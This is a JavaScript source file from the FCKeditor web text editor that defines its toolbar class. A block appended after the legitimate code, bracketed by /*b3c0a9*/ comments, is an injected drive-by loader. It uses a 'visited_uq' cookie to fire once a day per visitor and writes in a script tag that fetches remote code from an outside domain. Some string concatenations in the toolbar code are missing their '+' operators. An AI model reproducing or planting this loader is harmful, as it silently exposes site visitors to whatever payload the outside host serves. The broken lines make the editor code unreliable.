/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fcktoolbar.js
 * 	FCKToolbar Class: represents a toolbar. A toolbar is not the complete
 * 	toolbar set visible, but just a strip on it... a group of items.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKToolbar = function()
{
	this.Items = new Array() ;
	
	var e = this.DOMTable = document.createElement( 'table' ) ;
	e.className = 'TB_Toolbar' ;

	// Sets the toolbar direction. IE uses "styleFloat" and Gecko uses "cssFloat".
	e.style.styleFloat = e.style.cssFloat = FCKLang.Dir == 'rtl' ? 'right' : 'left' ;

	e.cellPadding = 0 ;
	e.cellSpacing = 0 ;
	e.border = 0 ;

	this.DOMRow = e.insertRow(-1) ;

	var oCell = this.DOMRow.insertCell(-1) ;
	oCell.className = 'TB_Start' ;
	oCell.innerHTML = '<img src="'   FCKConfig.SkinPath   'images/toolbar.start.gif" width="7" height="21" style="VISIBILITY: hidden" onload="this.style.visibility = \'\';">' ;

	FCKToolbarSet.DOMElement.appendChild( e ) ;
}

FCKToolbar.prototype.AddItem = function( toolbarItem )
{
	this.Items[ this.Items.length ] = toolbarItem ;
	toolbarItem.CreateInstance( this ) ;
}

FCKToolbar.prototype.AddSeparator = function()
{
	var oCell = this.DOMRow.insertCell(-1) ;
	oCell.innerHTML = '<img src="'   FCKConfig.SkinPath   'images/toolbar.separator.gif" width="5" height="21" style="VISIBILITY: hidden" onload="this.style.visibility = \'\';">' ;
}

FCKToolbar.prototype.AddTerminator = function()
{
	var oCell = this.DOMRow.insertCell(-1) ;
	oCell.className = 'TB_End' ;
	oCell.innerHTML = '<img src="'   FCKConfig.SkinPath   'images/toolbar.end.gif" width="12" height="21" style="VISIBILITY: hidden" onload="this.style.visibility = \'\';">' ;
}


/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
